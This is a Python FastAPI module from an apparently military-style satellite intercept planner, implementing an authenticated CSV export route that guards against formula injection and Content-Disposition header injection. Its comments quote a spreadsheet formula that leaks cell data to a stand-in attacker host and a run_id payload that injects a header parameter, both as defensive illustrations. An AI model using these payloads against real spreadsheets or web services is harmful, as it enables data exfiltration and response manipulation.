"""Session-level planning utilities — export and summary routes.

Handles cross-cutting concerns that span the maneuver, threat, and asset layers
(intercept history export, future: session report generation).
"""

from __future__ import annotations

import csv
import io
import logging
import re
from datetime import UTC, datetime
from typing import Annotated, Any

from fastapi import APIRouter, Depends, HTTPException, Query, Request, status
from fastapi.responses import StreamingResponse

from spectre.web.auth import require_login
from spectre.web.log_safety import log_safe
from spectre.web.models import User
from spectre.web.planning_state import get_session_state

logger = logging.getLogger(__name__)

router = APIRouter(prefix="/plan")

# Excel, LibreOffice Calc and Google Sheets evaluate a cell whose text begins
# with one of these as a formula. The rows below carry operator- and UDL-supplied
# strings (satellite names, segment names, notes, the operator's own username),
# so a name of ``=HYPERLINK("http://attacker/"&A1,"ok")`` runs in the analyst's
# spreadsheet on open. Nothing in SPECTRE executes it; the export is the carrier.
_CSV_FORMULA_LEADS = ("=", "+", "-", "@", "\t", "\r")

# A negative delta-v is written as "-123.456" and starts with a formula lead, so
# a blanket escape would quote every retrograde burn in the file and break the
# "importable into pandas without reshaping" promise in the docstring below.
# A number is not a formula, so numbers are let through unchanged.
_CSV_NUMERIC = re.compile(r"[-+]?\d+(\.\d+)?([eE][-+]?\d+)?")


def _csv_safe(field: object) -> object:
    """Return *field* in a form no spreadsheet will evaluate.

    The leading apostrophe is the convention Excel, Calc and Sheets all honour:
    the cell is forced to text and the apostrophe itself is not displayed. Only
    strings that actually start with a formula lead are touched, so the numeric
    columns and every ordinary name come through byte for byte.
    """
    if not isinstance(field, str) or not field.startswith(_CSV_FORMULA_LEADS):
        return field
    if _CSV_NUMERIC.fullmatch(field):
        return field
    return "'" + field


def _write_row(writer: Any, row: list[object]) -> None:
    """Write *row* with every field neutralised.

    Every row in this module goes through here rather than calling writerow
    directly, and a unit test walks this file's AST to keep it that way: an
    export added later must not be able to reintroduce the injection by
    reaching for csv.writer's own method.
    """
    writer.writerow([_csv_safe(field) for field in row])


# RFC 6266 gives the filename parameter of Content-Disposition no escaping
# mechanism whatsoever: inside the quoted string a double quote ends the value,
# a semicolon starts the next header parameter, and a CR or an LF ends the
# header. run_id is an operator-supplied query value that lands straight in that
# filename, so ?run_id=x";%20name="evil closes the quote and appends a header
# parameter the caller names. That is response-header injection, CWE-113. The
# CRLF form of the same payload is stopped today only by uvicorn's own header
# validator, which raises and drops the connection, so the application's answer
# to it is an unhandled exception rather than a handled refusal. The route is a
# GET and the session cookie is SameSite=lax, so a link in an email fires it
# inside an authenticated operator's session with no CSRF token needed.
#
# An allow-list can afford to be this strict because every run identifier the
# application mints already sits inside it: InterceptResult.option_id in
# spectre/domain/models.py is "INT_" plus ten uppercase hex characters, and the
# manoeuvre variant is the same shape behind an "MNV_" prefix. Sixty-four
# characters leaves generous room above both while staying far too short to
# carry a useful payload.
_RUN_ID_PATTERN = re.compile(r"[A-Za-z0-9_-]{1,64}")

# Anything outside the set the accepted run_id is already confined to.
_FILENAME_UNSAFE = re.compile(r"[^A-Za-z0-9_.-]")


def _attachment_disposition(filename: str) -> str:
    """Return a Content-Disposition value whose filename cannot break its quotes.

    This is the second barrier rather than the first: _RUN_ID_PATTERN has
    already refused everything outside the allow-list before a value reaches
    here. It exists because the header is still assembled by string formatting,
    and a later widening of that pattern, or a second export added here that
    forgets to validate at all, would otherwise reopen CWE-113 unnoticed.
    Substituting rather than rejecting keeps the worst case a slightly altered
    saved filename instead of a download that fails.
    """
    return f'attachment; filename="{_FILENAME_UNSAFE.sub("_", filename)}"'


@router.get("/export", response_model=None)
async def export_intercepts(
    request: Request,
    run_id: Annotated[
        str | None,
        Query(description="option_id of a specific run to export; omit for full session history"),
    ] = None,
    current_user: User = Depends(require_login),
) -> StreamingResponse:
    """Return the operator's intercept history as a downloadable CSV.

    One row is emitted per **burn** within each result so the file is
    importable directly into Excel or pandas without further reshaping.
    When a result produced no discrete burns (assessment-type methods)
    a single row is emitted with blank burn columns.

    Optionally filtered to a single run via ``?run_id=<option_id>``.

    A run_id outside _RUN_ID_PATTERN is refused with 400 before it is used
    anywhere.
    """
    if run_id is not None and not _RUN_ID_PATTERN.fullmatch(run_id):
        # 400 rather than quietly dropping the filter. Ignoring it would answer
        # a request for one run with the operator's entire intercept history,
        # which is a wider egress than the caller asked for and gives no sign
        # anything went wrong: the operator opens the file believing it holds
        # only the run they named. The refusal is decided by the shape of the
        # string alone and never by whether a matching run exists, so repeating
        # it with different values tells a caller nothing about what the session
        # holds, and the pattern it has to satisfy is readable in this file.
        logger.warning(
            "Intercept export refused: operator=%s malformed run_id=%s",
            log_safe(current_user.username), log_safe(run_id),
        )
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail="Invalid run_id.",
        )

    state = get_session_state(current_user.username)

    if run_id:
        results = [r for r in state.intercept_history if r.option_id == run_id]
        if not results and state.last_intercept_result and state.last_intercept_result.option_id == run_id:
            results = [state.last_intercept_result]
    else:
        results = list(state.intercept_history)

    buf = io.StringIO()
    writer = csv.writer(buf)

    # Metadata header (# comments are ignored by most parsers, readable as-is)
    now_utc = datetime.now(UTC).strftime("%Y-%m-%dT%H:%M:%SZ")
    _write_row(writer, [f"# SPECTRE Intercept Export — {now_utc} — Operator: {current_user.username}"])
    _write_row(writer, [f"# Runs: {len(results)}  Filter: {run_id or 'all'}"])
    _write_row(writer, [])

    _write_row(writer, [
        "run_id",
        "method",
        "red_name",
        "blue_name",
        "total_dv_m_s",
        "arrival_utc",
        "miss_km",
        "n_burns",
        "burn_num",
        "segment",
        "burn_epoch_utc",
        "burn_dv_m_s",
        "dv_prograde_m_s",
        "dv_normal_m_s",
        "dv_radial_m_s",
        "notes",
    ])

    for r in results:
        common = [
            r.option_id,
            r.method.value,
            r.red_name,
            r.blue_name,
            f"{r.total_delta_v_m_s:.3f}",
            r.arrival_epoch.strftime("%Y-%m-%d %H:%M:%S"),
            f"{r.intercept_range_km:.3f}",
            len(r.burns),
        ]
        if r.burns:
            for b in r.burns:
                _write_row(writer, [
                    *common,
                    b.burn_number,
                    b.segment_name,
                    b.burn_epoch.strftime("%Y-%m-%d %H:%M:%S"),
                    f"{b.delta_v_m_s:.3f}",
                    f"{b.dv_prograde:.3f}",
                    f"{b.dv_normal:.3f}",
                    f"{b.dv_radial:.3f}",
                    r.notes,
                ])
        else:
            _write_row(writer, [*common, "", "", "", "", "", "", "", r.notes])

    timestamp = datetime.now(UTC).strftime("%Y%m%d_%H%M%S")
    filename = (
        f"spectre_intercepts_{run_id}_{timestamp}.csv"
        if run_id
        else f"spectre_intercepts_{timestamp}.csv"
    )

    logger.info(
        "Intercept export: operator=%s rows=%d filter=%s filename=%s",
        log_safe(current_user.username), len(results), log_safe(run_id or "all"), log_safe(filename),
    )

    return StreamingResponse(
        iter([buf.getvalue()]),
        media_type="text/csv; charset=utf-8",
        headers={
            "Content-Disposition": _attachment_disposition(filename),
            "Cache-Control": "no-store",
        },
    )
